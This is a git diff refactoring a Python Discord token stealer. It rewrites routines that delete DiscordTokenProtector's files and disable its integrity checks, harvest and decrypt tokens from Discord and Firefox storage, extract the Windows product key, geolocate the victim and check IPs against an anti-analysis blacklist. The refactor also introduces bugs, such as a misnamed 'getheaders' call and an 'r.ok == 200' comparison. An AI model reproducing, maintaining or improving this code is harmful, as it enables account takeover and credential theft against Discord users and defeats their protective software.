@@ -112,7 +112,7 @@ def get_location(embed, ip_url: str = None):
         city = data.get("city")
         country = data.get("country")
         region = data.get("region")
-        googlemap = "https://www.google.com/maps/search/google+map++" + loc
+        googlemap = f"https://www.google.com/maps/search/google+map++{loc}"
 
         embed.add_field(
             name="📍  LOC INFO",
@@ -162,7 +162,7 @@ class GrabTokens:
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
         }
         if token:
-            headers.update({"Authorization": token})
+            headers["Authorization"] = token
         return headers
 
     def get_master_key(self, path):
@@ -176,30 +176,33 @@ class GrabTokens:
         return master_key
 
     def bypass_token_protector(self):
-        tp = f"{self.roaming}\\DiscordTokenProtector\\"
-        config = tp + "config.json"
+        token_protector = f"{self.roaming}\\DiscordTokenProtector\\"
+        config = f"{token_protector}config.json"
+
         for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
             with suppress(OSError):
-                os.remove(tp + i)
+                os.remove(token_protector + i)
 
         with open(config) as f:
             item: dict = json.load(f)
 
         # Not quite sure if dict.update works like this,
         # but I believe in '**kwargs' lmao
-        item.update(auto_start=False)
-        item.update(auto_start_discord=False)
-        item.update(integrity=False)
-        item.update(integrity_allowbetterdiscord=False)
-        item.update(integrity_checkexecutable=False)
-        item.update(integrity_checkhash=False)
-        item.update(integrity_checkmodule=False)
-        item.update(integrity_checkscripts=False)
-        item.update(integrity_checkresource=False)
-        item.update(integrity_redownloadhashes=False)
-        item.update(iterations_iv=364)
-        item.update(iterations_key=457)
-        item.update(version=69420)
+        item.update(
+            auto_start=False,
+            auto_start_discord=False,
+            integrity=False,
+            integrity_allowbetterdiscord=False,
+            integrity_checkexecutable=False,
+            integrity_checkhash=False,
+            integrity_checkmodule=False,
+            integrity_checkscripts=False,
+            integrity_checkresource=False,
+            integrity_redownloadhashes=False,
+            iterations_iv=364,
+            iterations_key=457,
+            version=69420,
+        )
 
         with open(config, "w") as f:
             json.dump(item, f, indent=2, sort_keys=True)
@@ -214,10 +217,8 @@ class GrabTokens:
             return decrypted_pass
 
     def getProductKey(self, path: str = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"):
-        def strToInt(x):
-            if isinstance(x, str):
-                return ord(x)
-            return x
+        def str_to_int(x):
+            return ord(x) if isinstance(x, str) else x
 
         chars = "BCDFGHJKMPQRTVWXY2346789"
         wkey = ""
@@ -232,7 +233,7 @@ class GrabTokens:
             for j in range(14, -1, -1):
                 temp *= 256
                 try:
-                    temp += strToInt(key[j + offset])
+                    temp += str_to_int(key[j + offset])
                 except IndexError:
                     return [productName, ""]
                 if temp / 24 <= 255:
@@ -246,7 +247,9 @@ class GrabTokens:
             wkey = wkey[:i] + "-" + wkey[i:]
         return [productName, wkey]
 
-    def grabTokens(self, token, tokens):  # TODO: Annotations for intellisense
+    def grabTokens(
+        self, token, tokens, embed: Embed
+    ):  # TODO: Annotations for intellisense
         # This dict could be compressed a bit and
         # make it dynamic...i dunno
         paths = {
@@ -293,7 +296,7 @@ class GrabTokens:
         for _, path in paths.items():
             if not os.path.exists(path):
                 continue
-            if not "discord" in path:
+            if "discord" not in path:
                 for file_name in os.listdir(path):
                     if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                         continue
@@ -311,36 +314,29 @@ class GrabTokens:
 
                                 if resp.ok and token not in self.tokens:
                                     self.tokens.append(token)
-            else:
-                if os.path.exists(self.roaming + "\\discord\\Local State"):
-                    for file_name in os.listdir(path):
-                        if not file_name.endswith(".log") and not file_name.endswith(
-                            ".ldb"
-                        ):
-                            continue
-                        for line in [
-                            x.strip()
-                            for x in open(
-                                f"{path}\\{file_name}", errors="ignore"
-                            ).readlines()
-                            if x.strip()
-                        ]:
-                            for y in findall(self.encrypted_regex, line):
-                                token = None
-                                token = self.decrypt_password(
-                                    base64.b64decode(
-                                        y[: y.find('"')].split("dQw4w9WgXcQ:")[1]
-                                    ),
-                                    self.get_master_key(
-                                        self.roaming + "\\discord\\Local State"
-                                    ),
-                                )
+            elif os.path.exists(self.roaming + "\\discord\\Local State"):
+                for file_name in os.listdir(path):
+                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+                        continue
+                    for line in [
+                        x.strip()
+                        for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
+                        if x.strip()
+                    ]:
+                        for y in findall(self.encrypted_regex, line):
+                            token = None
+                            token = self.decrypt_password(
+                                base64.b64decode(
+                                    y[: y.find('"')].split("dQw4w9WgXcQ:")[1]
+                                ),
+                                self.get_master_key(
+                                    self.roaming + "\\discord\\Local State"
+                                ),
+                            )
 
-                                resp = requests.get(
-                                    self.baseurl, headers=self.get_headers(token)
-                                )
-                                if resp.status_code == 200 and token not in self.tokens:
-                                    self.tokens.append(token)
+                            r = requests.get(self.baseurl, headers=self.getheaders(token))
+                            if r.ok == 200 and token not in self.tokens:
+                                self.tokens.append(token)
 
         if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
@@ -359,7 +355,7 @@ class GrabTokens:
                                         self.baseurl, headers=self.get_headers(token)
                                     )
 
-                                if resp.status_code == 200 and token not in self.tokens:
+                                if resp.ok and token not in self.tokens:
                                     self.tokens.append(token)
 
         for token in self.tokens:
@@ -573,8 +569,7 @@ class Debug:
 
     def get_ip(self):
         url = "http://ipinfo.io/json"
-        response = urlopen(url)
-        data = load(response)
+        data = get(url).json()
         ip = data.get("ip")
 
         if ip in self.blackListedIPS:
